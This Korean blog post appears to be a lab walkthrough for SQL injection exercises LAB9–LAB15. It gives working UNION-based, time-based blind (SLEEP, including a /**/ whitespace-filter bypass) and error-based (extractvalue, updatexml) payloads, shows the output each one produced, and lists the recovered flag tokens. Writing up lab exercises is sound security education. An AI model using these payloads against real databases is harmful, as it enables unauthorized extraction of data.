---
title: "웹보안 및 모의해킹 Lab - SQLi Labs (3) Blind and Error-Based"
date: 2026-03-20T19:20:00+09:00
categories:
  - Web Hacking
tags:
  - Web Security Lab
  - SQL Injection
  - Blind SQL Injection
  - Time-Based SQL Injection
  - Error-Based SQL Injection
last_modified_at: 2026-03-26T19:20:00+09:00
published: true
---
## 문제

대상: `http://192.168.0.21:8080/vuln/sqli/`

범위: `LAB9 ~ LAB15`

## 개요

이 구간은 응답 화면에 값이 직접 보이지 않아도, 간접 신호를 이용해 데이터를 꺼내는 방식이 중심임

- `GROUP_CONCAT` 결과가 특정 응답 필드에 들어가는 경우
- 참/거짓 대신 시간 지연으로 확인하는 경우
- 에러 메시지에 값을 실어 보내는 경우

즉 “화면에 바로 안 보이면 끝”이 아니라, 어떤 신호를 통해 DB 값을 확인할 수 있는지 보는 흐름이 중요했음

## 먼저 알아두면 좋은 SQL 함수와 구문

- `GROUP_CONCAT(column)`: 여러 행 값을 하나의 문자열로 합침
- `SLEEP(3)`: 쿼리 실행을 3초 동안 지연시킴
- `database()`: 현재 DB 이름 반환
- `information_schema.tables`: 테이블 이름 목록을 확인할 수 있는 시스템 테이블
- `information_schema.columns`: 컬럼 이름 목록을 확인할 수 있는 시스템 테이블
- `extractvalue()`, `updatexml()`: 잘못된 XPath를 넣으면 에러 메시지를 반환하는 함수
- `concat(a,b,c)`: 여러 문자열을 하나로 이어 붙임
- `0x7e`: 16진수 표기이며 `~` 문자에 해당함
- `LIMIT 0,1`: 첫 번째 행 1개를 의미

예를 들어

```sql
SELECT group_concat(column_name)
FROM information_schema.columns
WHERE table_name='users'
```

는 `users` 테이블의 컬럼 이름을 한 줄로 이어 보여달라는 의미다

## LAB9 ~ LAB11. 중복확인 응답 악용

### 개요

세 랩 모두 `matched_username` 같은 응답 필드에 쿼리 결과를 밀어 넣을 수 있는 구조. 따라서 처음부터 테이블과 컬럼을 안다고 가정하기보다, 현재 DB, 테이블, 컬럼을 하나씩 확인하는 흐름으로 접근 가능

### 1단계. 현재 DB 확인

```sql
' UNION SELECT database()#
```

확인한 출력:

```json
{ "ok": true, "duplicate": true, "matched_username": "seculab" }
```

### 2단계. 테이블 확인

```sql
' UNION SELECT group_concat(table_name)
FROM information_schema.tables
WHERE table_schema=database()#
```

확인한 출력:

```json
{ "ok": true, "duplicate": true, "matched_username": "users,sqli_lab9_reserved" }
```

### 3단계. 컬럼 확인

예를 들어 `sqli_lab9_reserved`를 찾은 뒤:

```sql
' UNION SELECT group_concat(column_name)
FROM information_schema.columns
WHERE table_name='sqli_lab9_reserved'#
```

확인한 출력:

```json
{ "ok": true, "duplicate": true, "matched_username": "id,username" }
```

### 4단계. 값 추출

```sql
' UNION SELECT GROUP_CONCAT(username) FROM sqli_lab9_reserved#
```

### LAB9 결과

```json
{ "ok": true, "duplicate": true, "matched_username": "early_bird,internal_hold,SEC-SQLI-LAB9-N3mK8pQ2" }
```

```text
SEC-SQLI-LAB9-N3mK8pQ2
```

### LAB10 결과

```sql
' UNION SELECT GROUP_CONCAT(username) FROM sqli_lab10_reserved#
```

```json
{ "ok": true, "duplicate": true, "matched_username": "demo_reserved,SEC-SQLI-LAB10-R7vW4xZ1" }
```

```text
SEC-SQLI-LAB10-R7vW4xZ1
```

### LAB11 결과

```sql
' UNION SELECT GROUP_CONCAT(username) FROM sqli_lab11_reserved#
```

```json
{ "ok": true, "duplicate": true, "matched_username": "batch_hold,SEC-SQLI-LAB11-T2yU5aB9" }
```

```text
SEC-SQLI-LAB11-T2yU5aB9
```

### 대표 대체 페이로드

```sql
' UNION SELECT user()#
' UNION SELECT version()#
' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#
' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='sqli_lab10_reserved'#
```

## LAB12. Time-Based Blind SQLi

### 개요

화면에 결과가 직접 출력되지 않아도, 응답 시간이 늘어나면 조건이 실행되었다고 판단할 수 있는 구조

### 사용한 페이로드

```sql
%' OR SLEEP(3) OR '%'='
```

### 확인한 출력

```text
원본 요청 응답 시간: 약 0.1초
SLEEP(3) 삽입 후 응답 시간: 약 3.1초
```

### 분석

- LIKE 문맥에서 문자열을 닫고 `SLEEP(3)` 호출
- 응답 시간이 3초 이상 증가하면 Injection 가능성 확인 가능

### 대표 대체 페이로드

```sql
%' OR SLEEP(2) OR '%'='
%' AND SLEEP(3) AND '%'='
```

문법은 백엔드 쿼리 구조에 따라 달라질 수 있음
핵심: 참 조건일 때 지연 발생

### 결과

```text
SEC-SQLI-LAB12-T1mE2b3s
```

## LAB13. Time-Based Blind SQLi - 주석 우회

### 사용한 페이로드

```sql
%'/**/OR/**/SLEEP(3)/**/OR/**/'%'='
```

### 확인한 출력

```text
원본 요청 응답 시간: 약 0.1초
우회 페이로드 응답 시간: 약 3.0초
```

### 분석

- 공백 필터를 피하기 위해 `/**/`를 사용
- 기본 구조는 Lab 12와 동일

### 대표 대체 페이로드

```sql
%'/**/OR/**/SLEEP(2)/**/OR/**/'%'='
%'/**/AND/**/SLEEP(3)/**/AND/**/'%'='
```

### 결과

```text
SEC-SQLI-LAB13-T4mE5b6s
```

## LAB14. Error-Based SQLi - extractvalue

### 개요

이 랩부터는 DB/테이블/컬럼을 처음부터 모른다고 가정하고, 에러 메시지에 값을 실어 나르는 흐름으로 접근하는 것이 자연스러웠음

### 1단계. 현재 DB 확인

```sql
' AND extractvalue(1,concat(0x7e,database(),0x7e))-- 
```

확인한 출력:

```text
XPATH syntax error: '~seculab~'
```

### 2단계. 테이블 확인

```sql
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- 
```

확인한 출력:

```text
XPATH syntax error: '~users,sqli_lab14_secrets~'
```

### 3단계. 컬럼 확인

```sql
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='sqli_lab14_secrets'),0x7e))-- 
```

확인한 출력:

```text
XPATH syntax error: '~id,token~'
```

또는 개별 확인:

```sql
' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='sqli_lab14_secrets' LIMIT 0,1),0x7e))-- 
```

```sql
' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='sqli_lab14_secrets' LIMIT 1,1),0x7e))-- 
```

### 4단계. 값 추출

```sql
' AND extractvalue(1,concat(0x7e,(SELECT token FROM sqli_lab14_secrets LIMIT 0,1),0x7e))-- 
```

확인한 출력:

```text
XPATH syntax error: '~SEC-SQLI-LAB14-E7rR8b9s~'
```

### 분석

- `extractvalue`는 XPath 오류를 내며 문자열을 그대로 포함할 수 있음
- `0x7e`는 `~` 문자로, 에러 메시지 안에서 값 경계를 구분하기 쉽게 해줌

### 결과

```text
SEC-SQLI-LAB14-E7rR8b9s
```

## LAB15. Error-Based SQLi - updatexml

### 개요

이번에는 `extractvalue`가 막히거나 제거된 상황을 가정하고, 같은 계열 함수인 `updatexml`로 에러를 유도하는 구조

### 1단계. DB/테이블/컬럼 확인

DB 확인:

```sql
' AND updatexml(1,concat(0x7e,database(),0x7e),1)-- 
```

확인한 출력:

```text
XPATH syntax error: '~seculab~'
```

테이블 확인:

```sql
' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)-- 
```

확인한 출력:

```text
XPATH syntax error: '~users,sqli_lab15_secrets~'
```

컬럼 확인:

```sql
' AND updatexml(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='sqli_lab15_secrets'),0x7e),1)-- 
```

확인한 출력:

```text
XPATH syntax error: '~id,token~'
```

### 2단계. 토큰 추출

```sql
' AND updatexml(1,concat(0x7e,(SELECT token FROM sqli_lab15_secrets LIMIT 0,1),0x7e),1)-- 
```

### 오류 메시지

```text
XPATH syntax error: '~SEC-SQLI-LAB15-E0rR1b2s~'
```

### 결과

```text
SEC-SQLI-LAB15-E0rR1b2s
```

## 정리

이 구간에서 중요한 것은 “정답 토큰만 바로 빼는 것”이 아니라, 출력 경로가 없는 경우 어떻게 단계적으로 정찰할 수 있는지를 이해하는 것이었음

- 출력형 응답이면 `GROUP_CONCAT`
- 출력이 없으면 `SLEEP()`
- 에러가 보이면 `extractvalue`, `updatexml`
- 항상 `database() -> tables -> columns -> value` 순서로 진행

즉 DB 구조를 모른다고 가정해도, `information_schema`와 간접 신호를 이용하면 충분히 한 단계씩 좁혀갈 수 있다

